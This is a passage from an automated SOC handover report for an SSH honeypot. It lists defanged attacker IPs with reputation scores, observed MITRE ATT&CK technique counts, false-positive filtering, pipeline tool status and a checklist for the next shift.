| `43.153.12[.]68` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 19 |
| `23.91.97[.]213` | HK | UCLOUD | **100** ⚠️ | 27 |
| `14.103.118[.]114` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `111.251.211[.]19` | TW | Chunghwa Telecom Co.,Ltd. | **69** | 0 |
| `52.176.138[.]192` | US | Microsoft Corporation | **63** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 49 cases |
| Tool 34  | Credential Extractor        | ✅ 19 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (53.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 8 recon entry/entries in table (1 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-19T09:00:13Z_
